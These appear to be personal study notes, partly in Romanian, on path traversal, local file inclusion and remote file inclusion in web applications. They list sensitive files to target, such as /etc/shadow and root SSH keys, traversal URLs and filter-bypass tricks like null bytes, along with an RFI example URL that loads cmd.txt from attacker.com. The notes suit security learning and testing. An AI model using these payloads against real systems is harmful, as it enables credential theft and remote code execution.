<h2>Path Traversal(../ attack)</h2>
	Get contents of a file not in root app directory via a php function, like file_get_contents.
	Can use known directories and files for testing
		/etc/passwd
		/etc/shadow
		/root/.bash-history
		/var/log/dmessage
		/var/mail/root
		/root/.ssh/id_rsa
		/var/log/apache2/access.log
		/proc/version
		/etc/profile
		/etc/issue
		C:\boot.ini
	
	`http://webapp.com/get.php?file=../../../../etc/passwd`


<h2>Local File Inclusion(LFI)</h2>
Basically the same as ../ attack, only that it targets include/require/include_once functions.
Can work on Node.js / PHP/ ASP/ JSP / others.
Se pot folosi informatii din erori pentru a descoperi unde treubuie sa navigam cu ../

->Daca serverul verifica extensia fisierului pe care incercam sa l accesam ilegitim, atunci trebuie sa folosim un NULL BYTE la final(%00) pentru a spune serverului sa ignore extensia
(Fixed in php 5.3.4)
->Daca serverul are filtru pe functia vulnerabila, atunci putem folosi ori NULL BYTE ori putem sa punem la final /.(/etc/passwd/.)
->Daca serverul filtreaza ../ putem pune in locul lui `.. ../ / (fara spatii)`
->Daca serverul forteaza un directory anume, atunci trebuie sa l includem in variabila
	`?lang=languages/../../../../../etc/passwd`


<h3>Proces</h3>
1. Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!
2. Enter a valid input to see how the web server behaves.
3. Enter invalid inputs, including special characters and common file names.
4. Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
6. Understand the input validation and if there are any filters!
7. Try the inject a valid entry to read sensitive files
<h2>Remote FIle Inclusion</h2>
Folosesti functia include sa accesezi un fisier de pe un server extern
**Trebuie ca optiunea `allow_url_fopen` sa fie setata pe `on`!**
Exemplu:
`http://webapp.com/get.php?file=http://attacker.com/cmd.txt`


